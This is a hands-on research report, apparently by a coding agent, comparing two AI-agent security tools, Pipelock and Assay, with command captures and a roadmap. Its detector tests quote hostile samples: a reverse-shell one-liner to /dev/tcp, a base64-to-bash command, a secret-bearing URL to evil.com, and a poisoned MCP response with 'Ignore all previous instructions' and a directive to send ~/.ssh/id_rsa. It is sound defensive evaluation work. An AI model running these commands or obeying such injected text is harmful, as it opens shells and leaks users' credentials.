# Pipelock vs. Assay: capability comparison and parity roadmap

Status: research report (non-normative). Adds no production behavior.
Author surface: Cursor background agent, hands-on comparison.

> Scope note. This document compares an external tool (Pipelock) with Assay to find where
> Assay can reach parity or do better. It is **not** an ADR and changes no Assay behavior.
> Recommendations that would cross the ADR-042 stop list are flagged inline as **[STOP-LIST]**
> and are recorded as boundary conflicts, not endorsements. Every number or verdict below is
> tied to the exact binary/SHA and command that produced it (see Methodology).

---

## 1. Executive summary

Pipelock and Assay both target AI-agent / MCP runtime security, but they sit at **different
layers** and answer **different questions**, so most of the comparison is about *shape*, not a
single scoreboard.

- **Pipelock is an inline, content-aware egress firewall.** It sits on the wire between an agent
  and the network/MCP servers and inspects the bytes crossing every mediated transport (HTTP
  fetch/forward/CONNECT, WebSocket, MCP stdio + HTTP, A2A). Its core value is *detection*: DLP
  secret patterns, prompt-injection patterns with normalization, SSRF, tool-description poisoning,
  tool-call chains, seed phrases, address poisoning. It emits Ed25519-signed action receipts and a
  hash-chained flight-recorder log, ships compliance-framework mappings and letter-grade posture
  scoring, and offers one-command IDE integrations. Enforcement is either **cooperative-proxy**
  (the agent must be routed through it) or **OS/deployment containment** (Landlock + seccomp +
  netns sandbox, host `contain`, K8s NetworkPolicy).

- **Assay is an evidence-first trust compiler.** Its core value is *verifiable evidence and
  deterministic policy decisions*, not content sniffing. It provides trace-replay evaluation
  (metrics/baselines), an MCP `proxy-enforce` **policy decision point** (caller-allowance,
  credential-scope, and manifest-**drift**/rug-pull gates), content-addressed evidence bundles
  (JCS/RFC 8785 + SHA-256 run-root), offline profile verifiers that emit an explicit **claim
  matrix + non-claims**, an attack-sim harness that hardens the *verification boundary*, a
  Landlock TCP-port egress sandbox that emits a signed `enforcement_health.v1` artifact, MCP tool
  signing, DSSE attestation, and a CycloneDX AI-BOM projection. Its scope is deliberately bounded
  by the ADR-042 stop list (no scalar trust score, no whole-action verdict, no compliance claim).

**Headline finding.** The two tools are more complementary than competitive, but Pipelock has a
large **content-inspection and breadth-of-transport surface that Assay has essentially none of**:
runtime DLP, prompt-injection detection, SSRF/URL scanning, WebSocket/HTTP/A2A coverage, and
pre-execution MCP tool-policy rules. Conversely, **Assay's evidence discipline (content-addressed
bundles, claim matrix, "incomplete by design" non-claims, fail-closed evidence writes) is at least
as rigorous as Pipelock's receipt model, and its deterministic trace-replay evaluation has no
Pipelock equivalent.** Several of Pipelock's most marketable features — a numeric security grade,
compliance/framework coverage, a scalar posture score — are **exactly the things ADR-042 forbids
Assay from copying**, so "parity" there means *deliberately declining*, not building.

The prioritized roadmap (§7) recommends Assay close the gaps that are inside its charter — most
importantly a **content-observation layer for the MCP proxy path** (recording DLP/injection
*observations*, never a verdict) and **broader transport coverage** — and explicitly decline the
gaps that are stop-list violations.

---

## 2. Methodology and measurement provenance

All commands were run hands-on in the task VM (Linux `6.12.94+`, x86_64, network egress
allow-all). Outputs quoted below are real captures; logs are saved under `/tmp/pl-logs/` in the
run environment.

### Versions / SHAs

| Component | Version | Provenance |
|-----------|---------|-----------|
| Assay repo (`main`) | `6.2.1` release commit | `git rev-parse HEAD` = `9977503de164c8420ed76f0cc39f500a18cf23b9` |
| `assay` binary (on PATH) | `6.1.0` | `assay version` → `6.1.0` |
| `assay-mcp-server` binary | `6.1.0` | `assay-mcp-server --version` |
| Pipelock binary | `3.5.0` (git `ca05ed06`, built with go1.25.12, 2026-09-01) | `pipelock version` |
| Pipelock tarball | `pipelock_3.5.0_linux_amd64.tar.gz` | SHA-256 `0e9fe1461107e8fc6a7f7969c87e7810824b019eaabd6fa7318f642ca9e4b858`, verified against `checksums.txt` (`sha256sum -c` → OK) |

> **Provenance caveat.** The installed `assay`/`assay-mcp-server` binaries report `6.1.0`, while
> the checked-out repo `main` is the `6.2.1` release commit. Assay results below reflect the
> **6.1.0 binaries** plus repo fixtures/examples at `9977503d`. Pipelock is the **official
> prebuilt release** (so paid-tier code is present but inert without a license), not a
> `go install` Community build.

### How each tool was installed

- **Pipelock:** downloaded the v3.5.0 `linux_amd64` release tarball, verified its SHA-256 against
  the published `checksums.txt`, and placed the `pipelock` binary on PATH. `go install` was not
  usable (host Go is `1.22.2`; Pipelock needs `1.25+`), and the prebuilt release is the correct
  choice anyway because it carries the paid-tier code paths (gated by license).
- **Assay:** already on PATH in the environment; repo at `/workspace`.

### What I could NOT exercise (honest limitations)

**Pipelock (gated or infra-dependent):**

- **Paid tiers.** `dashboard serve` and `conductor bootstrap` fail closed with a license error
  (`requires a license that grants "agents"` / `"fleet"`). So the **Evidence dashboard (Pro)**,
  **Conductor fleet control plane (Enterprise)**, and the multi-agent (`enterprise/`, ELv2)
  features were **not** exercised. `baseline` / `adaptive` operator CLIs require a running
  admin API and were not driven end to end.
- **TLS interception MITM of live HTTPS** — I generated a CA (`pipelock tls init`) but did not
  install it system-wide and MITM a real HTTPS flow.
- **A2A scanning, filesystem sentinel live trip, canary live trip, kill-switch API, forward-proxy
  CONNECT** (the default config disables forward proxy; `/fetch` and MCP paths were exercised).
- **SLSA attestation verification** (`gh attestation verify`) was not run.

**Assay (infra-dependent):**

- **eBPF/LSM Tier-1 kernel monitor** — `assay doctor` reports `bpf_lsm.available: false` on this
  kernel, and `assay monitor` needs `target/assay-ebpf.o` (`cargo xtask build-ebpf`) plus
  privileges. I exercised the **Landlock sandbox** path instead (which *is* available: ABI v6,
  `fs_enforce` and `net_enforce` true).
- **BYOS evidence store** (`evidence push/pull/list`) — no remote store configured.
- Full `assay ci` gate and `registry` OIDC round-trips were not driven.

Where a capability was not exercised, it is marked **(not exercised)** in the matrix and never
counted as verified.

---

## 3. Side-by-side capability matrix

Legend: **Y** = present and exercised here; **Y\*** = present, documented, but not fully exercised
(see §2); **partial** = narrower than the other tool; **N** = absent; **[SL]** = building this in
Assay would conflict with the ADR-042 stop list.

| Capability | Pipelock 3.5.0 | Assay 6.1.0 |
|---|---|---|
| **Enforcement model** | Inline content-aware proxy (cooperative) + OS/netns containment | Trace-replay eval + MCP policy proxy + Landlock sandbox + eBPF/LSM (Linux) |
| Runtime DLP / secret patterns | Y (62–65 patterns + entropy + BIP-39) | N |
| Prompt-injection detection (network) | Y (29 patterns, 6-pass normalization) | N |
| Invisible-unicode / bidi file scan | Y (`pipelock scan`) | N |
| SSRF / URL egress scanning | Y (11-layer, DNS-rebinding) | N (Landlock is TCP-port only) |
| Kernel-level egress enforcement | Y\* (netns in sandbox; `contain` nftables) | partial (Landlock TCP **port** allowlist; no IP/host/route) |
| MCP tool-description poisoning scan | Y (`mcp scan`, `mcp proxy`) | partial (tool **signing**, not content scan) |
| MCP tool-policy pre-exec rules | Y (17 built-in, shell-obfuscation, `redirect`, `defer`/HITL) | partial (allowance/scope gate, no arg-pattern rule engine) |
| MCP session binding / drift (rug-pull) | Y (baseline, session binding) | **Y (drift gate is first-class, enforced)** |
| Tool-call **chain** detection | Y (10 patterns, subsequence match) | N |
| Transports covered | HTTP fetch/forward/CONNECT-TLS, WS, MCP stdio+HTTP, A2A | MCP stdio (proxy-enforce); syscalls/net via eBPF (Linux) |
| Signed action receipts (Ed25519) | Y (per action, inline verify + offline) | partial (bundle-level + DSSE attest; no per-call signed receipt) |
| Hash-chained tamper-evident log | Y (flight recorder JSONL + transcript root) | Y (content-addressed bundle, JCS + SHA-256 run-root) |
| Offline third-party verifier | Y (`verify-receipt`, `pipelock-verifier`, Go/TS/Rust/Py) | Y (`evidence verify-*`, conformance vectors) |
| Explicit non-claims in verifier output | Y (`L-*` limits, containment UNKNOWN) | **Y (claim matrix + `non_claims`, "incomplete by design")** |
| Deterministic trace-replay evaluation | N | **Y (metrics, VCR, baselines)** |
| Attack-simulation harness | Y (detection scorecard, grade) | Y (hardens **verification boundary**; no grade) |
| SARIF 2.1.0 output | Y (`audit`, scan) | Y (`enforcement-sarif`, `evidence lint`) |
| Compliance framework mappings | Y (OWASP MCP/Agentic/LLM, NIST, EU AI Act, SOC2) | N **[SL]** (no compliance claim) |
| Scalar security score / letter grade | Y (`assess`, `audit score`) | N **[SL]** (no scalar trust score) |
| CycloneDX SBOM (own binary) | Y | Y (release workflow) |
| SLSA / build provenance | Y\* | Y (attest-build-provenance) |
| AI-BOM of the subject | N | Y (`evidence project-skill-bom`, CycloneDX 1.6) |
| Kill switch (multi-source) | Y (4 sources) | partial (`assay mcp kill`) |
| Canary tokens / DoW budgets / adaptive | Y / Y\* / Y\* | N |
| IDE one-command integrations | Y (Cursor/VS Code/Claude/Zed/JetBrains/…) | partial (`mcp config-path`, `mcp wrap`) |
| Fleet control plane | Y\* (Conductor, Enterprise) | N |
| Fully-open core | partial (core Apache-2.0; dashboard/fleet/multi-agent paid) | Y (no license gate observed on core) |

---

## 4. Per-capability analysis (with evidence)

### 4.1 Enforcement model and threat model

**Pipelock** is explicit and honest that the proxy alone is cooperative. `pipelock doctor`:

```
[INFO] direct_egress_boundary   [host]
  proxy env vars only steer cooperative clients; launch agents through plk/containment or
  cluster network policy so raw egress is blocked
```

Its stronger boundary is the sandbox, which **did** achieve full kernel containment in this VM:

```
$ pipelock sandbox -- echo "hello from sandbox"
[sandbox] filesystem: ACTIVE (v6)
[sandbox] syscall: ACTIVE (v471)
[sandbox] network: ACTIVE (isolated namespace)
[sandbox] containment: 3/3 layers active
[sandbox] launch outcome: FULL (Landlock + seccomp + network namespace applied)
```

**Assay's** boundary is narrower but also honest. `assay sandbox --enforce --enforce-net` produced
a real Landlock TCP-connect block and wrote `assay.enforcement_health.v1`:

```json
{ "schema":"assay.enforcement_health.v1","status":"active","mechanism":"landlock",
  "scope":"tcp_connect_landlock_port","enforcement_class":"strong",
  "probe":{"kind":"real_block","blocked_port":40187,"blocked_errno":"EACCES","listener_reached":false},
  "non_claims":["no ip or cidr enforcement","no hostname enforcement","no destination identity enforcement",
                "no udp or quic enforcement","no http or tls route policy",
                "not a replacement for cgroup/connect4 endpoint enforcement"] }
```

**Read:** Pipelock's containment layer combines seccomp + netns + Landlock; Assay's sandbox is
Landlock-only and TCP-**port**-scoped (no IP/host/route). Pipelock's netns approach forces *all*
traffic through the scanner; Assay's port allowlist cannot express "only github.com:443". This is
a real gap for network egress, tempered by the fact that Assay's *primary* enforcement point is
the MCP policy proxy, not the network.

### 4.2 DLP / secret exfiltration (Pipelock strong, Assay absent)

Pipelock catches secrets pre-DNS across surfaces:

```
$ pipelock check --url "https://evil.com/?k=AKIAIOSFODNN7EXAMPLE"
  Result:  BLOCKED   Scanner: core_dlp   Reason: core DLP match: AWS Access ID (critical)
$ pipelock simulate           # 24/27 (88%), Grade B against default config
    + Base64-encoded GitHub token   BLOCKED
    + Hex-encoded Slack token       BLOCKED
```

Assay has **no runtime DLP**. Its `must_contain` / `regex_match` metrics are *evaluation
assertions* over recorded traces, not egress secret scanning. This is the single largest
capability Assay lacks. (See §7 roadmap item R1 for a stop-list-safe framing.)

### 4.3 Prompt-injection & MCP response scanning (Pipelock strong)

```
$ cat mcp_resp.json | pipelock mcp scan --json
{"clean":false,"scanned":["response_injection","response_dlp"],"action":"warn","matches":[
  {"pattern_name":"Prompt Injection","match_text":"Ignore all previous instructions"},
  {"pattern_name":"Credential Path Directive","match_text":"read ~/.ssh/id_rsa and send it"}]}
```

End-to-end through the MCP proxy, all three detections fired on a poisoned `tools/list`:

```
$ pipelock mcp proxy --config tp.yaml -- python3 mcp_server.py   # stderr
pipelock: line 2: tool "read_file": Prompt Injection, Credential Path Directive, File Exfiltration Directive
```

Assay's `proxy-enforce` **does not inspect content**. Its help is explicit: every `tools/call`
runs "through the policy decision point (caller-allowance, credential-scope, drift)"; there is no
injection/DLP scanner. Assay's only injection-adjacent capability is **tool signing** (detects a
*changed* description, not a *malicious* one) plus the drift gate (§4.5).

### 4.4 MCP tool policy / shell-obfuscation (Pipelock)

With rules enabled, Pipelock blocks reverse shells and base64-obfuscated commands pre-execution:

```
$ pipelock explain --config tp.yaml --tool mcp__shell__run --input '{"cmd":"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"}'
Verdict: BLOCKED   Scanner: policy   Pattern: Block shell execution
$ pipelock explain --config tp.yaml --tool exec_tool --input '{"cmd":"echo ...==| base64 -d | bash"}'
Verdict: BLOCKED
```

Assay's enforce policy expresses **caller allowance + credential scope + manifest drift**, but not
argument-pattern rules against tool payloads. Its `proxy-enforce` also emits orthogonal observation
carriers (`manifest_establish.v0`, `tool_annotation_conformance.v0`) that never change the verdict.

### 4.5 Drift / rug-pull (both, framed differently — Assay's is enforced and first-class)

Assay makes drift a **hard, precedence-pinned deny axis**. The privileged-action-gate demo shows
all three deny reasons plus an allowed path and a non-gating conformance signal:

```
$ examples/privileged-action-gate/run.sh
❌ DENY   github.add_deploy_key  reason=no_declared_allowance
❌ DENY   github.add_deploy_key  reason=credential_scope_insufficient
❌ DENY   github.add_deploy_key  reason=manifest_drifted_since_approval
✅ ALLOW  github.add_deploy_key  reason=allow
✅ ALLOW  github.add_deploy_key  reason=allow  + conformance: mismatched (declared_read_only_observed_mutating)  [separate, non-gating]
```

Pipelock detects drift via **session binding** and the **behavioral baseline** (`baseline
ratify/forget`), and `mcp proxy` flags mid-session `tools/list` "rug-pull" changes. Several of
those (baseline lifecycle, learn-and-lock promotion) sit behind the admin API / Pro tier and were
**not exercised**. Net: comparable intent; **Assay's drift gate is stronger as an *enforced,
offline-verifiable* decision**, Pipelock's is broader as a *behavioral* monitor.

### 4.6 Evidence / audit — the closest and most important comparison

Both are excellent here; the difference is emphasis.

**Pipelock** — per-action Ed25519 receipts + hash-chained flight recorder. Offline verify, tamper
detection, and transcript root all confirmed:

```
$ pipelock verify-receipt <file> --key <pub>       # OK, prints signer + limits
$ pipelock verify-receipt tampered.json --key <pub>
FAILED: signature verification failed
$ pipelock transcript-root evidence-proxy-0.jsonl --key <pub>
  Root hash: 6e5b923c…  Receipt count: 5   (inner-tamper → "invalid chain: signature verification failed")
```

Crucially, Pipelock's verifier **enumerates its own limits** and refuses to overclaim:

```
Containment: UNKNOWN — this bundle proves what was routed through the proxy; it does NOT prove the
             agent could not bypass it (see L-CONTAINMENT-UNPROVEN). Supply --posture to attest.
Limit: L-RECORDER-BINARY: A malicious/modified recorder binary IS the attacker; its output cannot vouch for itself.
```

The append-only log manifest even records `"coverage":"mediated-only"`, `"custody":"same-process"`.

**Assay** — content-addressed bundles (JCS/RFC 8785, SHA-256 run-root) with a formal **claim
matrix** and `non_claims` in the verifier output:

```json
$ assay evidence verify-privileged-mcp-action ok-001…bundle.tar.gz --format json
{ "bundle_integrity":"pass","verdict":"valid",
  "claims":{ "policy_decision_recorded":{"status":"confirmed","source_class":"producer_reported"},
             "caller_visible_denial":{"status":"confirmed"},
             "upstream_delivery":{"status":"incomplete"},
             "external_side_effect":{"status":"incomplete"} },
  "non_claims":["allow does not prove upstream delivery","deny does not establish maliciousness", …] }
```

Fail-closed contract handling and tamper/contract classification confirmed:

```
$ assay evidence show -- invalid-manifest.bundle.tar.gz
[E_EVIDENCE_CONTRACT] … Manifest JSON is not well-formed (ContractInvalidJson)
$ assay evidence verify-privileged-mcp-action bad-105-…bundle.tar.gz --format json
verdict=invalid  id=observation_binding  reason_code=E_EVIDENCE_PROFILE_INVALID
```

**Read:** both refuse to turn absence into a clean result. **Pipelock's advantage** is the
per-action signed receipt and a *multi-language* verifier SDK (Go/TS/Rust/Python) plus a
conformance suite so relying parties can verify outside the producing binary. **Assay's advantage**
is the formalized claim matrix with `source_class` provenance and the explicit "incomplete by
design" for delivery/side-effect — a cleaner separation of *decision* from *outcome*.

### 4.7 Attack simulation — same word, different layer

`pipelock simulate` scores the **detection scanners** (DLP/injection/SSRF/tool-poison) and prints a
letter grade (`Score: 24/27 (88%) Grade: B`). `assay sim run` attacks the **evidence-verification
boundary** and reports blocked/bypassed with no grade:

```
$ assay sim run --suite quick --target test-bundle.tar.gz
integrity.bitflip Blocked … security.zip_bomb Blocked … SUMMARY: blocked=8 passed=1 bypassed=0
```

These are not substitutes: Pipelock proves *detections fire*; Assay proves *the verifier can't be
fooled by a crafted bundle*. Assay deliberately emits **no grade** (stop-list).

### 4.8 SARIF / CI

Both emit SARIF 2.1.0. Pipelock: `pipelock audit --format sarif` (drove it against `/workspace`
and it correctly found `.mcp.json` with the `assay` server, cargo ecosystem, claude-code agent).
Assay: `assay-mcp-server enforcement-sarif` and `assay evidence lint --format sarif`
(`ASSAY-W001` secret rule, etc.). Rough parity; Pipelock ships a packaged GitHub Action.

### 4.9 Compliance, scoring, posture — Pipelock feature, Assay stop-list

`pipelock assess` produces a signed evidence bundle **with a letter grade and framework coverage**:

```
$ pipelock assess status assessment-…      # Signed: true
$ cat summary.json  →  "overall_grade":"F","overall_score":57, sections[Config Posture/Deployment/Detection/MCP]
$ pipelock audit score  →  Overall: 52/170 (30%) Grade: F  across 23 categories
```

Assay has **no equivalent and should not build one**: a scalar score and a
"compliance/safe-agent" mapping are explicit ADR-042 stop-list items **[STOP-LIST]**. The parity
answer is to decline (§7 R6).

### 4.10 Supply chain / SBOM

Near parity for the tools' own binaries: Pipelock ships CycloneDX (`sbom-pipelock-linux-amd64.cdx.json`
is CycloneDX `specVersion 1.7`, 45 components) + SLSA provenance; Assay's `release.yml` runs
`cargo cyclonedx` and `attest-build-provenance`. Assay additionally projects a **CycloneDX 1.6
AI-BOM of the subject** (`assay evidence project-skill-bom`) — a capability Pipelock does not have.

### 4.11 Licensing / openness

Pipelock core is Apache-2.0; the **dashboard (Pro/`agents`)**, **Conductor fleet (Enterprise/
`fleet`)**, and **multi-agent** features are paid (ELv2) and fail closed without a license
(confirmed live). Assay showed **no license gate on its core** in this exercise.

---

## 5. Pipelock capabilities Assay lacks or is weaker on

Ranked by how much they matter for an MCP/agent-security tool, with the stop-list flag where
relevant:

1. **Runtime content DLP** (secret patterns + entropy + BIP-39). Assay: none.
2. **Prompt-injection detection** with normalization (zero-width/homoglyph/leetspeak/base64).
   Assay: none (tool signing detects change, not malice).
3. **SSRF / URL egress scanning** (11-layer, DNS-rebinding). Assay: Landlock TCP-port only.
4. **Transport breadth** — HTTP forward/fetch, WebSocket, TLS-intercept, MCP HTTP, A2A. Assay:
   MCP stdio proxy + eBPF syscalls/net.
5. **MCP tool-policy rule engine** (arg-pattern rules, shell-obfuscation, `redirect`, `defer`/HITL
   holds with hash-chained defer+resolution receipts). Assay: allowance/scope/drift only.
6. **Tool-call chain detection** across a sequence of calls. Assay: none.
7. **Per-action Ed25519 receipts + multi-language verifier SDK + conformance vectors.** Assay:
   bundle-level + DSSE attestation, no per-call signed receipt, Rust-only verifier.
8. **Invisible-unicode / bidi file scanner** for agent-context files (`CLAUDE.md`, skills). Assay:
   none.
9. **IDE one-command integrations + hooks** (Cursor/VS Code/Claude/Zed/JetBrains). Assay: `mcp
   config-path`/`wrap` only.
10. **Operational safety primitives**: multi-source kill switch, canary tokens, denial-of-wallet
    budgets, adaptive escalation, filesystem sentinel, media/stego policy, address poisoning.
11. **Fleet control plane** (Conductor) — signed policy distribution, audit sink, remote kill.
12. **Compliance mappings + posture score + letter grade** — **[STOP-LIST]**, do not build.

---

## 6. Where Assay is already stronger or deliberately different

- **Deterministic trace-replay evaluation** (`assay run` + metrics + VCR + baselines). No Pipelock
  equivalent; this is Assay's own core.
- **Formal claim matrix + `source_class` + "incomplete by design"** — a cleaner decision/outcome
  separation than receipt limitation notes alone.
- **Drift/rug-pull as an enforced, offline-verifiable deny axis** with a declared-manifest baseline.
- **Fail-closed evidence semantics** (an allowed call is *not forwarded* if its evidence record
  cannot be written).
- **AI-BOM of the subject** (skill supply-chain → CycloneDX).
- **Principled scope** — declining scalar scores/compliance claims is a feature for the audiences
  that distrust them.

---

## 7. Prioritized parity roadmap (mapped to crates; stop-list flagged)

Each item: what to build, which Assay crate/command changes, and any stop-list conflict. **These
are recommendations for a future ADR-scoped effort, not changes made here.**

### R1 — MCP content **observation** layer (highest value, stop-list-safe if framed as observation)
- **Gap:** DLP + prompt-injection (§4.2, §4.3).
- **Where:** new scanner module consumed by `assay-mcp-server proxy-enforce` (crates
  `assay-mcp-server`, `assay-metrics`), emitting a new **observation carrier** (e.g.
  `assay.content_observation.v0`) alongside `enforcement_decision.v0`, verified by a new
  `assay evidence verify-*` profile in `assay-evidence`.
- **Stop-list discipline:** record **observations, not verdicts** — a DLP/injection *match* is an
  observation with `source_class`, and must **not** become a scalar risk score or a whole-action
  verdict (ADR-042). Keep it orthogonal to allow/deny, exactly like today's
  `tool_annotation_conformance.v0`. **Safe if and only if it stays an observation.**
- **Note:** the ADR-043 rule "treat all evidence inputs as hostile / apply ceilings" means the
  scanner must run under `LimitReader`-style bounds.

### R2 — Broader transport coverage for the proxy path
- **Gap:** §4.1, §4 matrix (WebSocket, MCP HTTP, forward/CONNECT).
- **Where:** `assay-mcp-server` (add MCP **Streamable HTTP** upstream mode to complement stdio),
  and evaluate an HTTP forward-proxy observation mode. Cursor Background Agents must not mutate
  auth/evidence-boundary code, so this is a design-ADR item, not a drive-by.
- **Stop-list:** none, provided it stays evidence/policy and does not become a "provider-outcome
  verification" or generic egress firewall claim.

### R3 — Per-call signed receipt + multi-language verifier
- **Gap:** §4.6 item 7.
- **Where:** extend `assay-canonical` + `assay-evidence` to optionally emit a **signed per-call
  receipt** bound to the `enforcement_decision.v0` (reuse `assay_common::dsse` PAE — the contract
  already mandates one PAE), and publish a **minimal verifier spec** so non-Rust relying parties
  can verify (mirrors Pipelock's conformance vectors). Assay already has DSSE attestation; this is
  granularity + portability, not a new trust model.
- **Stop-list:** none.

### R4 — MCP tool-policy argument-rule engine + human-in-the-loop hold
- **Gap:** §4.4 (arg-pattern rules, `defer`/HITL).
- **Where:** extend the enforce-policy schema in `assay-policy` with argument-pattern rules and a
  **defer/hold** outcome that emits hash-chained defer + resolution carriers (Assay already has the
  evidence primitives). Keep "one rule, one function": the load-time validator and the
  execution-time matcher must share code (AGENTS.md).
- **Stop-list:** none (this is policy, not a detector catalogue). Avoid shipping a large built-in
  "detector catalogue" of tool-poison signatures — that edges toward the stop-list "detector
  catalogue/broad MCP scan"; prefer user-authored rules + observation carriers.

### R5 — Tool-call **chain** observation
- **Gap:** §5 item 6.
- **Where:** a sequence-aware observation over the `enforcement_decision`/`content_observation`
  stream in `assay-metrics` / `assay-evidence`, recorded as an observation carrier.
- **Stop-list:** frame as observation, not a "whole-action verdict" over a chain.

### R6 — Explicitly **decline** compliance scoring / letter grades — **[STOP-LIST]**
- **Gap:** §4.9. Pipelock's `assess`/`audit score` grades and framework mappings.
- **Action:** *do not build.* Scalar trust score and compliance/safe-agent claims are named
  stop-list items. If procurement pressure arises, answer with the **trust-card** (`assay
  trust-card generate`, already producing JSON/MD/HTML from a verified bundle) which reports
  *verified evidence + non-claims* rather than a grade. Record the decision, don't implement.

### R7 — Operational safety primitives (selective, stop-list-aware)
- **Gap:** §5 item 10 (kill switch breadth, canary, DoW budgets).
- **Where:** `assay mcp kill` exists; a **multi-source kill switch** and **canary observation**
  are compatible with the evidence model. **Denial-of-wallet budgets** are fine as *observations/
  limits*. Avoid "generic agent identity/delegation/federation" primitives (stop-list) that
  Pipelock's mediation-envelope/SPIFFE features imply — those are **[STOP-LIST]** for Assay.

### R8 — Invisible-unicode / agent-context file scanner
- **Gap:** §5 item 8.
- **Where:** small standalone check (could live near `assay-canonical`/a new lint rule in
  `assay-evidence` lint registry, e.g. `ASSAY-W0xx`). Low risk, high signal for supply-chain
  prompt-injection; emits SARIF like existing lint rules.
- **Stop-list:** none.

### R9 — IDE integration ergonomics
- **Gap:** §5 item 9.
- **Where:** extend `assay mcp config-path` into one-command installers for Cursor/VS Code/Claude
  that route MCP servers through `proxy-enforce`. Pure ergonomics over existing capability.
- **Stop-list:** none.

**Explicitly out of charter (do not pursue):** Conductor-style fleet control plane framed as
generic identity/federation; provider-outcome verification; any "certified/compliant/safe-agent"
badge. These are **[STOP-LIST]** and belong in a "declined" section of any future ADR.

---

## 8. Bottom line for Assay

- **Build (in charter):** R1 content **observations** on the MCP path, R2 transport breadth, R3
  per-call signed receipts + portable verifier, R4 argument-rule + HITL policy, R8 unicode scan,
  R9 IDE ergonomics. These close the gaps that matter without crossing ADR-042.
- **Keep leaning on:** trace-replay evaluation, the claim matrix / non-claims discipline, the
  enforced drift gate, fail-closed evidence writes, AI-BOM. These are genuine differentiators.
- **Decline (stop-list):** scalar scores, letter grades, compliance/safe-agent mappings, generic
  identity/federation, provider-outcome verification. Answer that market with verified evidence +
  explicit non-claims (trust-card), not a grade.

The most honest one-line summary: **Pipelock inspects content on the wire and grades you; Assay
proves what was decided and refuses to grade.** Assay's parity play is to add *content
observations* and *transport breadth* under its evidence discipline — not to become a second
content-scoring firewall.
